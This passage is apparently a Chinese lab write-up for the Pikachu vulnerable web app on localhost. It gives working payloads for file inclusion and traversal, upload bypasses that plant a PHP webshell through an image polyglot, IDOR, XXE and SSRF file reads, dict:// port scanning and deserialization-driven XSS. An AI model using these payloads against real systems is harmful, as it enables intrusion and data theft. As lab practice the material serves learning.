phpinfo();\n\n经过查看源码发现代码如下\n\n于是尝试用蚁剑进行连接，最后发现修改如下可以成功连接\n\n\n\n0x07 File Inclusionfile inclusion(local)..\\..\\..\\Users\\sfd\\Desktop\\demo.txt#直接访问电脑桌面的文件\n\n\nfile inclusion(remote)同标题，还是相同的位置，可以通过输入链接进行访问其他东西\n0x08 Unsafe file downloadUnsafe file download当鼠标悬浮在要下载的文件上时，发现左下角有详细链接\n那么我们可以修改这个链接指向的filename来进行下载任意文件\n\n要下载本地文件用法和[File Inclusion(loacl)](#File Inclusion(local))一样，直接在filename&#x3D;后面添加想要下载文件的相对位置\n0x09 [unsafe upfileupload]client check先上传一张图片，然后burp抓包，修改后缀后放包即可\n最后用蚁剑连接即可。\nMIME type直接上传php木马，同样抓包，然后修改Content-Type 为 image&#x2F;png 即可\n\ngetimagesize()添加了对文件进行判断有没有图片特征的函数，直接用cmd命令合成一个图片码即可绕过\ncopy /b a.png + a.php b.png\n\n\n0x10 over permission水平越权首先以lucy的身份进行登录，然后可以看到lucy的信息\nhttp://127.0.0.1/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF\n\n这时我们直接修改url里的username，将其指定为kobe,就可以直接查看kobe的信息\nhttp://127.0.0.1/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF\n\n垂直越权pikachu用户只有查看权限，而admin用户有所有权限\n首先登陆admin并添加用户，然后可以获得一个url地址\nhttp://127.0.0.1/vul/overpermission/op2/op2_admin_edit.php\n\n然后我们用pikachu用户登陆，然后直接输入上面的地址，发现可以进入添加用户界面，并且可以正常添加用户，回到admin用户后发现可以看到当前创建的用户\n0x11 ..&#x2F;..&#x2F;(目录遍历)目录遍历../../../../Users/sfd/Desktop/demo.txt#访问桌面的一个demo.txt 文件\n\n0x12 敏感信息泄露icanyourABCF12进行元素审查时发现一个测试用户可以使用\n\n0x13 php反序列化php反序列化漏洞php涉及到序列化的函数有两个，分别是serialize()和unserialize()\n序列化简单来说就是将一个对象转化成可以传输的字符串，反序列化就是相反的操作\n#举个例子class S&#123;        public $test=&quot;pikachu&quot;;    &#125;        $s=new S(); //创建一个对象    serialize($s); //把这个对象进行序列化        序列化后得到的结果是这个样子的 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;  \t    O:代表object        1:代表对象名字长度为一个字符        S:对象的名称        1:代表对象里面有一个变量        s:数据类型        4:变量名称的长度        test:变量名称        s:数据类型        7:变量值的长度        pikachu:变量值\n\n反序列化\n$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);    echo $u-&gt;test; //得到的结果为pikachu\n\n序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题\n常见的几个魔法函数:\t__construct()当一个对象创建时被调用\t__destruct()当一个对象销毁时被调用\t__toString()当一个对象被当作一个字符串使用\t__sleep() 在对象在被序列化之前运行\t__wakeup将在序列化之后立即被调用漏洞举例:\tclass S&#123;\t\tvar $test = &quot;pikachu&quot;;\t\tfunction __destruct()&#123;\t\t\techo $this-&gt;test;\t\t&#125;\t&#125;\t$s = $_GET[&#x27;test&#x27;];\t@$unser = unserialize($a);\tpayload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;\n\n0x14 XXEXXE漏洞前端将$_POST[&#39;xml&#39;]传递给变量$xml, 由于后台没有对此变量进行安全判断就直接使用simplexml_load_string函数进行xml解析, 从而导致xxe漏洞\n&lt;!-- 打印hello world --&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE note [    &lt;!ENTITY test &quot;hello world&quot;&gt;]&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;!-- 读取D盘根目录下的a.txt --&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY[  \t&lt;!ENTITY f SYSTEM &quot;file:///D:/a.txt&quot;&gt; ]&gt; &lt;x&gt;&amp;f;&lt;/x&gt;\n\n0x15 URL重定向不安全的url跳转修改url&#x3D;后面的参数\nhttp://127.0.0.1/vul/urlredirect/urlredirect.php?url=https://baidu.com\n\n0x16 SSRF\ncurl 支持更多协议，有http、https、ftp、gopher、telnet、dict、file、ldap；模拟 Cookie 登录，爬取网页；FTP 上传下载。\nfopen &#x2F; file_get_contents 只能使用 GET 方式获取数据\n\nSSRF漏洞常用协议：\nSSRF(curl)通过url参数直接访问内部资源，或者跳转到其他服务器页面\nHTTP(s):最常用到的一种协议，可以用来验证是否存在SSRF漏洞，探测端口以及服务。file：本地文件传输协议，可以用来读取任意系统文件dict:字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628。在SSRF漏洞中可用于探测端口以及攻击内网应用ghoper:互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。可用于攻击内网应用，可用于反弹shell。\n\n例：\n//访问内网链接资源http://127.0.0.1/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php//读取D盘根目录a.txthttp://127.0.0.1/vul/ssrf/ssrf_curl.php?url=file:///D:/a.txt//用dict扫描内网主机开放的端口，端口存在时显示不同的信息dict://192.168.1.66:80\n\nSSRF(file_get_content)利用file_get_content(“path”)利用传递的参数，通过file参数访问内部资源，或者跳转到其他服务器页面\n//直接读取内部文件http://127.0.0.1/vul/ssrf/ssrf_fgc.php?file=D:/a.txt\n\nphp伪协议读取文件\nphp://filter/read=convert.base64-encode/resource=D:/a.txt\n\n\n\nTitle: Pikachu练习记录\n\n","categories":["Pikachu"],"tags":["Pikachu","靶场","网络安全"]}]